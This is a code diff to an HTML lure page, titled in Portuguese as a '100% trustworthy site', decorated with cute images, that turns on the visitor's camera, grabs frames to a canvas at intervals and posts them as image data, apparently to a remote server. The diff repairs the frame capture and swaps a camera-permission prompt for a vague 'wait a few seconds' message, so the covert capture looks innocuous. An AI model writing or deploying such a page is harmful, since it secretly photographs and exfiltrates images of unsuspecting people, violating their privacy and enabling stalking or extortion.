@@ -1,8 +1,8 @@
 <!doctype html>
 <html>
-<title> Site 100% confiável, pode clicar🥰 </title>
+<title> Site 100% confiável, pode clicar🥰</title>
 <img src="https://w7.pngwing.com/pngs/657/55/png-transparent-hello-kitty-illustration-hello-kitty-online-sanrio-hello-kitty-poster-sticker-flower-thumbnail.png" alt="">
-<img src="https://static.wixstatic.com/media/368834_fe09ceaea3ac4992b8d81bfed572de23~mv2.png/v1/fill/w_768,h_768,al_c,q_90,enc_auto/368834_fe09ceaea3ac4992b8d81bfed572de23~mv2.png" alt="">
+<img  src="https://static.wixstatic.com/media/368834_fe09ceaea3ac4992b8d81bfed572de23~mv2.png/v1/fill/w_768,h_768,al_c,q_90,enc_auto/368834_fe09ceaea3ac4992b8d81bfed572de23~mv2.png" alt="">
 <head>
   <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
   <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
@@ -13,7 +13,7 @@
   <video id="video" playsinline autoplay></video>
 </div>
 
-<center><canvas id="canvas" width="720" height="1280" audoplay></canvas></center>
+<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
 
 <style>
   @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
@@ -168,7 +168,7 @@
     var context = canvas.getContext('2d');
     setInterval(function () {
 
-      context.drawImage(video, 720, 1280);
+      context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData);
       video.play();
@@ -195,7 +195,7 @@
   <div id="ac-wrapper">
     <div id="popup">
         <center>
-            <h2>Ative a permissão da câmera para continuar 🤓☝️   </h2>
+            <h2>Aguarde uns segudinhos 🤓☝️   </h2>
         </center>
     </div>
 </div>
